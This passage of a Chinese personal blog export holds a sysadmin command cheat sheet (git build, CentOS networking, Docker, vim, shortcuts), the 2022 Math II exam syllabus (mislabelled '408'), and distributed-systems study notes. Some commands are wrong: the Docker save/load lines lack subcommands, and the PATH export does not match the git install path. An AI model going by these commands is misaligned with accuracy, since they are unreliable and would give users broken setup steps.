<h2 id="卸载并安装新版git"><a href="#卸载并安装新版git" class="headerlink" title="卸载并安装新版git"></a>卸载并安装新版git</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">卸载</span></span><br><span class="line">yum -y remove git</span><br><span class="line">which -a git</span><br><span class="line">cd /usr/bin</span><br><span class="line">sudo rm -rf git*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/local</span><br><span class="line">wget https://github.com/git/git/archive/refs/tags/v2.32.0.tar.gz</span><br><span class="line">tar -zxvf v2.32.0.tar.gz </span><br><span class="line"></span><br><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br><span class="line">cd git-2.32.0/</span><br><span class="line">make prefix=/usr/local/git all</span><br><span class="line">make prefix=/usr/local/git install</span><br><span class="line">vi /etc/profile </span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/usr/bin/git/bin</span><br><span class="line">source /etc/profile</span><br><span class="line">git --version</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">http.h:6:23: 致命错误：curl/curl.h：没有那个文件或目录</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">执行即可解决</span></span><br><span class="line">yum -y install curl-devel</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">http-push.c:22:19: 致命错误：expat.h：没有那个文件或目录</span></span><br><span class="line">yum install -y  expat-devel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Centos-7"><a href="#Centos-7" class="headerlink" title="Centos 7"></a>Centos 7</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install man man-pages </span><br><span class="line">man 2 read</span><br><span class="line">tail -f out.11624</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /proc/$$/fd</span><br><span class="line">ll</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">yum install strace </span><br><span class="line"><span class="meta"># </span><span class="language-bash">forkfork output</span></span><br><span class="line">strace -ff -o out java SocketBIO</span><br><span class="line">nc localhost 9090</span><br><span class="line">exec 8&lt;&gt; /dev/tcp/www.baidu.com/80</span><br><span class="line">echo -e &quot;GET / HTTP/1.0\n&quot; &gt;&amp; 8</span><br><span class="line">cat 0&lt;&amp; 8</span><br><span class="line">curl www.baidu.com</span><br><span class="line">tcpdump -nn -i eth0 port 80</span><br><span class="line">tcpdump -nn -i eth0 arp or port 80</span><br><span class="line">route -n</span><br><span class="line">arp -d 10.211.55.1 &amp;&amp; curl www.baidu.com</span><br><span class="line">arp -a</span><br><span class="line">ifconfig lo:3. 192.168.88.88</span><br><span class="line">route add -host 192.168.88.88 gw 10.211.55.30</span><br><span class="line">find / -name &#x27;nginx&#x27;</span><br><span class="line">yum list installed | grep docker</span><br><span class="line">ifconfig</span><br><span class="line">touch</span><br><span class="line">vi</span><br><span class="line">mkdir leyou</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> -r和-f合写，-r表示递归地处理文件，即处理该目录及其所有子目录下符合条件的文件；-f则是无提示强制删除。</span></span><br><span class="line">rm -rf myzoo</span><br><span class="line">mv myzoo /var/www/myzoo</span><br><span class="line">pwd</span><br><span class="line">rm *</span><br><span class="line">whereis nginx</span><br><span class="line">systemctl reload apache2</span><br><span class="line">vi /etc/hosts</span><br><span class="line">cp -r myzoo /var/www</span><br><span class="line">kill -9 PID</span><br><span class="line">ps -ef|grep java</span><br><span class="line">netstat -apn|grep 5601</span><br><span class="line">netstat -natp</span><br><span class="line">ln -s /var/app/app/jar /etc/init.d/app</span><br><span class="line">chmod u+x app.jar</span><br><span class="line">service app start</span><br><span class="line"></span><br><span class="line">chkconfig servicename on/off</span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">查看PATH：echo $PATH</span><br><span class="line"></span><br><span class="line">scp /home/888.zip 192.168.1.2:/home/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">top</span><br><span class="line">free -m:看内存占用</span><br><span class="line">df -h ：看硬盘占用率</span><br></pre></td></tr></table></figure>

<p>tar功能：文件的压缩或解压</p>
<p>语法：tar 命令</p>
<blockquote>
<p>-c 建立一个压缩文件的参数指令（create） –压缩<br>-x 解开一个压缩文件的参数指令（extract） –解压<br>-z 是否需要gzip压缩<br>-v 显示压缩的过程（verbose）<br>-f 使用档名，在f之后要立即接档名（file）</p>
</blockquote>
<p>压缩：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf 文件名 压缩路径 </span><br></pre></td></tr></table></figure>

<p>解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 文件名</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf 文件名.tar.gz 要压缩文件路径</span><br></pre></td></tr></table></figure>

<p>解压缩</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 要解压的文件.tar.gz </span><br></pre></td></tr></table></figure>

<p>这个命令是解压到当前文件夹</p>
<p>解压到指定目录中（该目录需要存在）需要添加-C参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf 要解压的文件.tar.gz -C 指定目录路径</span><br></pre></td></tr></table></figure>

<h2 id="vi-x2F-vim"><a href="#vi-x2F-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> nu <span class="comment">#显示行号</span></span><br><span class="line">:<span class="built_in">set</span> nonu</span><br><span class="line"></span><br><span class="line">/bind.*6379 <span class="comment">#往下</span></span><br><span class="line">?<span class="built_in">bind</span>.*6379 <span class="comment">#往上</span></span><br><span class="line">n <span class="comment">#下一个</span></span><br><span class="line">N <span class="comment">#上一个</span></span><br><span class="line"></span><br><span class="line">x,X <span class="comment">#x向后删除一个字符,X向前删除一个字符</span></span><br><span class="line">ndd <span class="comment">#n为数字删除光标向下n行</span></span><br><span class="line">yy <span class="comment">#复制游标所在的那一行</span></span><br><span class="line">nyy <span class="comment">#n为数字复制游标所在的向下n行</span></span><br><span class="line">p,P <span class="comment">#p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用)</span></span><br><span class="line">u <span class="comment"># 复原上一个动作</span></span><br><span class="line">ctrl + r <span class="comment"># 重做上一个动作</span></span><br><span class="line">. <span class="comment">#不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211845759.gif" alt="img"></p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>退出dock容器: ctrl + D 或者输入exit</p>
<p>查看本地镜像: docker images</p>
<p>查看容器运行情况: docker ps</p>
<p>重启容器内的服务: docker restart nginx</p>
<p>查docker插件位置: docker volume inspect es-plugins</p>
<p>查看docker启动状态: systemctl status docker</p>
<p>启动docker服务: systemctl start docker</p>
<p>停止docker服务: systemctl stop docker</p>
<p>重启docker服务: systemctl restart docker</p>
<p>查看帮助: docker –help</p>
<p>加入开机自启: systemctl enable docker</p>
<p>显示所有容器包括停止的: docker ps -a</p>
<p>将多个镜像打包: docker -o xxx.tar 镜像1 镜像2</p>
<p>加载镜像: docker -i xxx.save.tar</p>
<h1 id="MACOS"><a href="#MACOS" class="headerlink" title="MACOS"></a>MACOS</h1><p>查ip：ifconfig | grep “inet “ | grep -v 127.0.0.1</p>
<p>显示隐藏文件夹: shift + command + .</p>
<p>切换桌面:control + 左和右和上和下</p>
<h2 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h2><p>跳出当前代码块：shift + command + enter </p>
<p>切换至上一个光标: option + command + 左右</p>
<p>重构: refactor</p>
<p>格式化代码: option + command + L</p>
<p>类和文件查询: shift + shift</p>
<p>全部内容查询: command + shift + R </p>
<p>当前文件查询: command + f</p>
<p>复制当前行: command + d</p>
<p>显示类的继承图: crtl + alt + U</p>
<p>调出idea寄存器保存的最近复制的N份内容,可选择性粘贴: shift + comamnd + v</p>
<p>补全当前行: shift+cmd + enter</p>
<p>将代码段封装成函数: option + command + m (按一次就默认生成,按两次为自定义生成)</p>
<p>for循环快捷方式: 100.for</p>
<p>快捷trycatch: option + command + T</p>
<p>if a &#x3D;&#x3D; null : a.null</p>
<p>if (flag) : flag.if</p>
<p>while (flag): flag.while</p>
<p>Rename: shift+fn+F6</p>
<p>插件</p>
<ul>
<li>一键生成set方法的插件：generateallsetter option+enter</li>
</ul>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>开发者工具: Shift + F12</p>
<p>清除格式: command + \</p>
<p>跳出列表或者引用: caps lock + enter</p>
<p>跳出代码块: command + enter</p>
<p>源代码模式: command + &#x2F;</p>
<p>加入目录: [TOC]</p>
<p>文档树模式: control+ command +3</p>
<p>大纲模式: control + command + 1</p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>切换虚拟桌面: win + Tab</p>
<p>新建虚拟桌面: win + ctrl + d</p>
<p>关闭虚拟桌面: win + ctrl + F4</p>
<p>显示桌面&#x2F;返回当前页面: win + d</p>
<p>打开文件资源管理器: win + e</p>
<p>打开设置: win + i</p>
<p>锁屏: win + L</p>
<p>打开运行窗口: win + r</p>
<p>快捷打印: win + p</p>
<p>任务切换: alt + tap</p>
<p>浏览器内窗口切换: ctrl + tap</p>
<p>关闭当前窗口: alt + f4 &#x2F; 双击窗口左上方</p>
<p>浏览器关闭当前活动窗口: ctrl + w</p>
<h3 id="idea-1"><a href="#idea-1" class="headerlink" title="idea"></a>idea</h3><table>
<thead>
<tr>
<th align="center">快捷键</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Ctrl + Y</td>
<td align="center">删除一行</td>
</tr>
<tr>
<td align="center">Ctrl + D</td>
<td align="center">复制一行</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + L</td>
<td align="center">格式化</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + O</td>
<td align="center">导包</td>
</tr>
<tr>
<td align="center">Alt+Insert（可修改）</td>
<td align="center">New菜单\代码生成菜单（生成getter和setter，maven依赖等）</td>
</tr>
<tr>
<td align="center">Ctrl + &#x2F;</td>
<td align="center">注释</td>
</tr>
<tr>
<td align="center">Ctrl + Shift + &#x2F;</td>
<td align="center">多行注释</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + 左&#x2F;右</td>
<td align="center">回退到上一次操作的地方，等于eclipse中的 Alt+左&#x2F;右</td>
</tr>
<tr>
<td align="center">Shift + Alt + 上&#x2F;下</td>
<td align="center">将代码上移或下移一行</td>
</tr>
</tbody></table>
<p>Ctrl + H ：罗列类的继承关系</p>
<p>连按两次shift，全局搜索</p>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>查看端口: netstat -ano</p>
<p>查看具体端口占用情况: netstat -aon|findstr “49157”</p>
<p>查进程名称: tasklist |findstr “进程id号”</p>
<p>查看会话: netstat -n</p>
<p>查看服务: msconfig</p>
<p>杀进程: tskill pid</p>
<p>杀进程: taskkill &#x2F;f &#x2F;t &#x2F;im “进程id或者进程名称”</p>
]]></content>
      <categories>
        <category>常用命令</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>centos</tag>
        <tag>docker</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年考研408计算机学科考试大纲</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E4%BA%8C%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022年考研数学二考试大纲"><a href="#2022年考研数学二考试大纲" class="headerlink" title="2022年考研数学二考试大纲"></a>2022年考研数学二考试大纲</h1><blockquote>
<p>叶纯宝宝专用版</p>
</blockquote>
<p><strong>考试科目：</strong>高等数学、线性代数</p>
<p><strong>考试形式和试卷结构</strong></p>
<p>一、试卷满分及考试时间</p>
<p>试卷满分为150分，考试时间为180分钟.</p>
<p>二、答题方式</p>
<p>答题方式为闭卷、笔试.</p>
<p>三、试卷内容结构</p>
<p>高等教学　约80%</p>
<p>线性代数　约20%</p>
<p>四、试卷题型结构</p>
<p>单项选择题 10小题，每小题5分，共50分</p>
<p>填空题 6小题，每小题5分，共30分</p>
<p>解答题(包括证明题) 7小题，共70分</p>
<h2 id="高等数学"><a href="#高等数学" class="headerlink" title="高等数学"></a><strong>高等数学</strong></h2><h3 id="一、函数、极限、连续"><a href="#一、函数、极限、连续" class="headerlink" title="一、函数、极限、连续"></a>一、函数、极限、连续</h3><p>函数的概念及表示法、函数的有界性、单调性、周期性和奇偶性、复合函数、反函数、分段函数和隐函数、基本初等函数的性质及其图形、初等函数函数关系的建立.</p>
<p>数列极限与函数极限的定义及其性质、函数的左极限与右极限、无穷小量和无穷大量的概念及其关系、无穷小量的性质及无穷小量的比较、极限的四则运算、极限存在的两个准则:单调有界准则和夹逼准则、两个重要极限:<br>$$<br>\lim_{x\rightarrow0}\frac{sinx}{x}&#x3D;1 \ \lim_{x\rightarrow\infty}(1 + \frac{1}{x})^x&#x3D;e<br>$$<br>函数连续的概念、函数间断点的类型、初等函数的连续性、闭区间上连续函数的性质.</p>
<p>考试要求</p>
<p>1.理解函数的概念，掌握函数的表示法，并会建立应用问题的函数关系.</p>
<p>2.了解函数的有界性、单调性、周期性和奇偶性.</p>
<p>3.理解复合函数及分段函数的概念、了解反函数及隐函数的概念、掌握基本初等函数的性质及其图形、了解初等函数的概念、理解极限的概念、理解函数左极限与右极限的概念以及函数极限存在与左极限、右极限之间的关系.</p>
<p>4.掌握极限的性质及四则运算法则.</p>
<p>5.掌握极限存在的两个准则，并会利用它们求极限，掌握利用两个重要极限求极限的方法.</p>
<p>6.理解无穷小量、无穷大量的概念，掌握无穷小量的比较方法,会用等价无穷小量求极限.</p>
<p>7.理解函数连续性的概念(含左连续与右连续)，会判别函数间断点的类型.</p>
<p>8.了解连续函数的性质和初等函数的连续性,理解闭区间上连续函数的性质(有界性、最大值和最小值定理、介值定理)，并会应用这些性质.</p>
<h3 id="二、一元函数微分学"><a href="#二、一元函数微分学" class="headerlink" title="二、一元函数微分学"></a>二、一元函数微分学</h3><p>导数和微分的概念、导数的几何意义和物理意义、函数的可导性与连续性之间的关系、平面曲线的切线和法线、导数和微分的四则运算、基本初等函数的导数、复合函数、反函数、隐函数以及参数方程所确定的函数的微分法、高阶导数、一阶微分形式的不变性、微分中值定理洛必达法则、函数单调性的判别、函数的极值、函数图形的凹凸性、拐点及渐近线、函数图形的描绘、函数的最大值与最小值、弧微分、曲率的概念、曲率圆与曲率半径.</p>
<p>考试要求</p>
<p>1.理解导数和微分的概念，理解导数与微分的关系，理解导数的几何意义，会求平面曲线的切线方程和法线方程，了解导数的物理意义，会用导数描述一些物理量,理解函数的可导性与连续性之间的关系.</p>
<p>2.掌握导数的四则运算法则和复合函数的求导法则，掌握基本初等函数的导数公式.了解微分的四则运算法则和一阶微分形式的不变性，会求函数的微分.</p>
<p>3.了解高阶导数的概念，会求简单函数的高阶导数.</p>
<p>4.会求分段函数的导数，会求隐函数和由参数方程所确定的函数以及反函数的导数.</p>
<p>5.理解并会用罗尔定理、拉格朗日中值定理和泰勒定理，了解并会用柯西中值定理.</p>
<p>6.掌握用洛必达法则求未定式极限的方法.</p>
<p>7.理解函数的极值概念，掌握用导数判断函数的单调性和求函数极值的方法,掌握函数最大值和最小值的求法及其应用.</p>
<p>8.会用导数判断函数图形的凹凸性(注:在区间(a.b)内,设函数(x)具有二阶导数当f”(x)&gt;0 时，f(x)的图形是凹的;当f”(X)&lt;0时,f(X)的图形是凸的)，会求函数图形的拐点以及水平、铅直和斜渐近线,会描绘函数的图形.</p>
<p>9.了解曲率、曲率圆和曲率半径的概念，会计算曲率和曲率半径.</p>
<h3 id="三、一元函数积分学"><a href="#三、一元函数积分学" class="headerlink" title="三、一元函数积分学"></a>三、一元函数积分学</h3><p>原函数和不定积分的概念、不定积分的基本性质、基本积分公:式、定积分的概念和基本性质、定积分中值定理、积分上限的函数及其导数、牛顿-菜布尼茨(Newton-Leibniz)公式、不定积分和定积分的换元积分法与分部积分法、有理函数、三角函数的有理式和简单无理函数的积分、反常(广义)积分、定积分的应用.</p>
<p>考试要求</p>
<p>1.理解原函数的概念，理解不定积分和定积分的概念.</p>
<p>2.掌握不定积分的基本公式，掌握不定积分和定积分的性质及定积分中值定理，掌握换元积分法与分部积分法.</p>
<p>3.会求有理函数、三角函数有理式和简单无理函数的积分.</p>
<p>4.理解积分上限的函数，会求它的导数，掌握牛顿一菜布尼茨公式.</p>
<p>5.了解反常积分的概念，会计算反常积分.</p>
<p>6.掌握用定积分表达和计算一些几何量与物理量(平面图形的面积、平面曲线的弧长、旋转体的体积及侧面积、平行截面面积为已知的立体体积、功、引力、压力、质心、形心等)及函数的平均值.</p>
<h3 id="四、多元函数微积分学"><a href="#四、多元函数微积分学" class="headerlink" title="四、多元函数微积分学"></a>四、多元函数微积分学</h3><p>多元函数的概念、二元函数的几何意义、二元函数的极限与连续的概念、有界闭区域.上二元连续函数的性质、多元函数的偏导数和全微分、多元复合函数、隐函数的求导法、二阶偏导数、多元函数的极值和条件极值、最大值和最小值、二重积分的概念、基本性质和计算.</p>
<p>考试要求</p>
<p>1.了解多元函数的概念，了解二元函数的几何意义.</p>
<p>2.了解二元函数的极限与连续的概念，了解有界闭区域上二元连续函数的性质.</p>
<p>3.了解多元函数偏导数与全微分的概念，会求多元复合函数一阶、二阶偏导数，会求全微分，了解隐函数存在定理，会求多元隐函数的偏导数.</p>
<p>4.了解多元函数极值和条件极值的概念，掌握多元函数极值存在的必要条件，了解二元函数极值存在的充分条件，会求二元函数的极值，会用拉格朗日乘数法求条件极值，会求简单多元函数的最大值和最小.值，并会解决一些简单的应用问题.</p>
<p>5.了解二重积分的概念与基本性质，掌握二重积分的计算方法(直角坐标、极坐标).</p>
<h3 id="五、常微分方程"><a href="#五、常微分方程" class="headerlink" title="五、常微分方程"></a>五、常微分方程</h3><p>常微分方程的基本概念、变量可分离的微分、齐次微分方程、一阶线性微分方程、可降阶的高阶微分方程、线性微分方程解的性质及解的结构定理、二阶常系数齐次线性微分方程、高于二阶的某些常系数齐次线性微分方程、简单的二阶常系数非齐次线性微分方程、微分方程的简单应用.</p>
<p>考试要求</p>
<p>1.了解微分方程及其阶、解、通解、初始条件和特解等概念.</p>
<p>2.掌握变量可分离的微分方程及一-阶线性微分方程的解法,会解齐次微分方程.</p>
<p>3.会用降阶法解下列形式的微分方程: y”&#x3D;f(x)、y”&#x3D; f(x,y’)和y”&#x3D;f(y,y’).</p>
<p>4.理解二阶线性微分方程解的性质及解的结构定理.</p>
<p>5.掌握二阶常系数齐次线性微分方程的解法，并会解某些高于二阶的常系数齐次线性微分方程.</p>
<p>6.会解自由项为多项式、指数函数、正弦函数、余弦函数以及它们的和与积的二阶常系数非齐次线性微分方程.</p>
<p>7.会用微分方程解决一些简单的应用问题.</p>
<h2 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a><strong>线性代数</strong></h2><h3 id="一、行列式"><a href="#一、行列式" class="headerlink" title="一、行列式"></a>一、行列式</h3><p>行列式的概念和基本性质、行列式按行(列)展开定理.</p>
<p>考试要求</p>
<p>1.了解行列式的概念，掌握行列式的性质.</p>
<p>2.会应用行列式的性质和行列式按行(列)展开定理计算行列式.</p>
<h3 id="二、矩阵"><a href="#二、矩阵" class="headerlink" title="二、矩阵"></a>二、矩阵</h3><p>矩阵的概念、矩阵的线性运算、矩阵的乘法、方阵的幂、方阵乘积的行列式、矩阵的转置、逆矩阵的概念和性质、矩阵可逆的充分必.要条件、伴随矩阵、矩阵的初等变换、初等矩阵、矩阵的秩、矩阵的等价、分块矩阵及其运算.</p>
<p>考试要求</p>
<p>1.理解矩阵的概念，了解单位矩阵、数量矩阵、对角矩阵、三角矩阵、对称矩阵、反对称矩阵和正交矩阵以及它们的性质.</p>
<p>2.掌握矩阵的线性运算、乘法、转置以及它们的运算规律，了解方阵的幂与方阵乘积的行列式的性质.</p>
<p>3.理解逆矩阵的概念，掌握逆矩阵的性质以及矩阵可逆的充分必要条件.理解伴随矩阵的概念，会用伴随矩阵求逆矩阵.</p>
<p>4.了解矩阵初等变换的概念，了解初等矩阵的性质和矩阵等价的概念，理解矩阵的秩的概念，掌握用初等变换求矩阵的秩和逆矩阵的方法.</p>
<p>5.了解分块矩阵及其运算.</p>
<h3 id="三、向量"><a href="#三、向量" class="headerlink" title="三、向量"></a>三、向量</h3><p>向量的概念、向量的线性组合和线性表示、向量组的线性相关与线性无关、向量组的极大线性无关组、等价向量组、向量组的秩、向.量组的秩与矩阵的秩之间的关系、向量的内积、线性无关向量组的的正交规范化方法.</p>
<p>考试要求</p>
<p>1.理解n维向量、向量的线性组合与线性表示的概念.</p>
<p>2.理解向量组线性相关、线性无关的概念，掌握向量组线性相关、线性无关的有关性质及判别法.</p>
<p>3.了解向量组的极大线性无关组和向量组的秩的概念，会求向量组的极大线性无关组及秩.</p>
<p>4.了解向量组等价的概念，了解矩阵的秩与其行(列)向量组的秩的关系.</p>
<p>5.了解内积的概念，掌握线性无关向量组正交规范化的施密特(Schmidt)方法.</p>
<h3 id="四、线性方程组"><a href="#四、线性方程组" class="headerlink" title="四、线性方程组"></a>四、线性方程组</h3><p>线性方程组的克拉默(Cramer)法则、齐次线性方程组有非零解的充分必要条件、非齐次线性方程组有解的充分必要条件、线性方程组解的性质和解的结构、齐次线性方程组的基础解系和通解、非齐次线性方程组的通解.</p>
<p>考试要求</p>
<p>1.会用克拉默法则.</p>
<p>2.理解齐次线性方程组有非零解的充分必要条件及非齐次线性方程组有解的充分必要条件.</p>
<p>3.理解齐次线性方程组的基础解系及通解的概念,掌握齐次线性方程组基础解系和通解的求法.</p>
<p>4.理解非齐次线性方程组的解的结构及通解的概念.</p>
<p>5.会用初等行变换求解线性方程组.</p>
<h3 id="五、矩阵的特征值及特征向量"><a href="#五、矩阵的特征值及特征向量" class="headerlink" title="五、矩阵的特征值及特征向量"></a>五、矩阵的特征值及特征向量</h3><p>矩阵的特征值和特征向量的概念，性质、相似矩阵的概念及性质、矩阵可相似对角化的充分必要条件、相似对角矩阵、实对称矩阵的特征值、特征向量及其相似对角矩阵.</p>
<p>考试要求</p>
<p>1.理解矩阵的特征值和特征向量的概念及性质，会求矩阵特征值和特征向量.</p>
<p>2.理解相似矩阵的概念、性质及矩阵可相似对角化的充分必要条件，会将矩阵化为相似对角矩阵.</p>
<p>3.理解实对称矩阵的特征值和特征向量的性质.</p>
<h3 id="六、二次型"><a href="#六、二次型" class="headerlink" title="六、二次型"></a>六、二次型</h3><p>二次型及其矩阵表示、合同变换与合同矩阵、二次型的秩、惯性定理、二次型的标准形和规范形、用正交变换和配方法化二次型为标准形、二次型及其矩阵的正定性.</p>
<p>考试要求</p>
<p>1.了解二次型的概念， 会用矩阵形式表示二次型，了解合同变换与合同矩阵的概念.</p>
<p>2.了解二次型的秩的概念，了解二次型的标准形、规范形等概念，了解惯性定理，会用正交变换和配方法化二次型为标准形。</p>
<p>3.理解正定二次型、正定矩阵的概念，并掌握其判别法.</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式与云计算</title>
    <url>/2021/06/21/ustc/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%8E%E4%BA%91%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="分布式与云计算"><a href="#分布式与云计算" class="headerlink" title="分布式与云计算"></a>分布式与云计算</h1><h1 id="Chapter-1-概述"><a href="#Chapter-1-概述" class="headerlink" title="Chapter 1 概述"></a>Chapter 1 概述</h1><h2 id="分布式系统的定义"><a href="#分布式系统的定义" class="headerlink" title="分布式系统的定义"></a>分布式系统的定义</h2><blockquote>
<p>分布式系统是若干独立计算机的集合，这些计算机对于用户来说就像是单个相关的系统。</p>
</blockquote>
<p>为了使种类各异的计算机和网络都呈现为单个的系统，分布式系统常常通过一个”软件层”组织起来，该”软件层”在逻辑上位于有用户和应用程序组成的高层与有操作系统组成的低层之间。这样的分布式系统又称为**中间件(middleware)**。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451738.png" alt="中间件"></p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="使资源可访问"><a href="#使资源可访问" class="headerlink" title="使资源可访问"></a>使资源可访问</h3><p>分布式系统最<strong>主要</strong>的目标是使用户能够方便地访问远程资源，并且以一种受控的方式与其他用户共享这些资源。</p>
<h3 id="透明性"><a href="#透明性" class="headerlink" title="透明性"></a>透明性</h3><p>分布式系统的<strong>重要</strong>目标之一是将它的进程和资源实际上在多台计算机上分布这样一个事实隐藏起来。如果一个分布式系统在用户和应用程序面前呈现为单个计算机系统，这样的分布式系统就称为是<strong>透明的</strong>。</p>
<h4 id="透明的类型"><a href="#透明的类型" class="headerlink" title="透明的类型"></a>透明的类型</h4><ul>
<li>访问透明性：对不同数据表示形式以及资源访问方式的隐藏；</li>
<li>位置透明性：用户无法判别资源在系统中的物理位置；</li>
<li>迁移透明性：如果分布式系统中的资源移动不会影响该资源的访问方式，就可以说这种分布式系统能提供；</li>
<li>重定位透明性：如果资源可以在接受访问的同时进行重新定位，而不引起用户和应用程序的注意，拥有这种资源的系统能提供重定位透明性。</li>
<li>复制透明性：对同一个资源存在多个副本这样一个事实的隐藏；</li>
<li>并发透明性：隐藏资源是否由若干相互竞争的用户共享这一事实；</li>
<li>故障透明性：隐藏资源的故障与恢复。</li>
</ul>
<h4 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h4><p>在设计并实现分布式系统时，把实现分布的透明性作为目标是正确的，但是应该将它和其他方面的问题（比如性能)结合起来考虑。</p>
<h3 id="开放性"><a href="#开放性" class="headerlink" title="开放性"></a>开放性</h3><p>开放式的分布式系统：根据一系列准则来提供服务，这些准则描述了所提供服务的语法和语义。</p>
<h3 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h3><p>系统的可扩展性至少可以通过三个方面来度量：</p>
<ol>
<li>规模可扩展：可方便向系统里加入更多用户和资源；</li>
<li>地域可扩展：可使系统中的用户与资源相隔十分遥远；</li>
<li>管理可扩展：即使分布式系统跨越多个独立的管理机构，仍然可以方便的对其进行管理。</li>
</ol>
<h4 id="可扩展性问题"><a href="#可扩展性问题" class="headerlink" title="可扩展性问题"></a>可扩展性问题</h4><p>分布式算法：</p>
<ol>
<li>没有任何计算机拥有整个系统的全局信息；</li>
<li>计算机只根据本地信息做出决策；</li>
<li>某台计算机的故障不会使算法崩溃；</li>
<li>不存在<strong>全局时钟</strong>。</li>
</ol>
<h4 id="扩展技术"><a href="#扩展技术" class="headerlink" title="扩展技术"></a>扩展技术</h4><h5 id="隐藏通信等待时间"><a href="#隐藏通信等待时间" class="headerlink" title="隐藏通信等待时间"></a>隐藏通信等待时间</h5><ol>
<li>使用<strong>异步通信</strong>，通常用于批处理系统；</li>
<li>启动一个新的控制线程来执行请求。</li>
</ol>
<p><strong>问题</strong>：有许多应用程序不适用此方式。</p>
<h5 id="分布技术"><a href="#分布技术" class="headerlink" title="分布技术"></a>分布技术</h5><p>把某个组件分割成多个部分，然后再把他们分散到系统中去。</p>
<p>例：DNS、万维网WWW</p>
<h5 id="复制技术"><a href="#复制技术" class="headerlink" title="复制技术"></a>复制技术</h5><p>对组件进行复制并将副本分布到系统各处。</p>
<p><strong>缓存</strong>是复制的一种特殊形式。缓存一般是在访问资源的客户<strong>附近</strong>制作该资源的副本。</p>
<h2 id="分布式系统的类型"><a href="#分布式系统的类型" class="headerlink" title="分布式系统的类型"></a>分布式系统的类型</h2><h3 id="分布式计算系统"><a href="#分布式计算系统" class="headerlink" title="分布式计算系统"></a>分布式计算系统</h3><blockquote>
<p>用于高性能计算任务的系统。</p>
</blockquote>
<h4 id="集群计算系统"><a href="#集群计算系统" class="headerlink" title="集群计算系统"></a>集群计算系统</h4><p>底层硬件是由类似的工作站或PC集组成，通过高速的局域网紧密连接起来的。而且，每个节点运行的是相同的操作系统。</p>
<p>集群计算系统的特点是同构性，大多数情况下，集群中的计算机都是相同的：</p>
<ul>
<li>有相同的操作系统</li>
<li>通过同一网络连接</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451739.png" alt="集群计算系统一个示例"></p>
<h4 id="网格计算系统"><a href="#网格计算系统" class="headerlink" title="网格计算系统"></a>网格计算系统</h4><p>组成分布式系统的子分组通常构建成一个计算机系统联盟，每个系统归属于不同的管理域。</p>
<p>网格计算系统具有高度异构性：</p>
<ul>
<li>硬件</li>
<li>操作系统</li>
<li>网络</li>
<li>管理域</li>
<li>安全策略</li>
</ul>
<p>都不尽相同。</p>
